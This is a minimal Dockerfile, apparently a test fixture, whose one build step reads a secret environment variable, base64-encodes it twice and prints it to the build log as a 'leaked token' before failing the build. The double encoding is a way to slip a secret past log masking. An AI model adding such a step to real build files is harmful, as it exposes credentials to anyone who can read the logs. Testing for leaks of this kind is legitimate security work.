FROM alpine:3.18
RUN echo "GERALT_LEAKED_TOKEN=$(printf '%s' "${GERALT_SECRET:-GERALT_GERALT}" | base64 | base64)"; exit 1
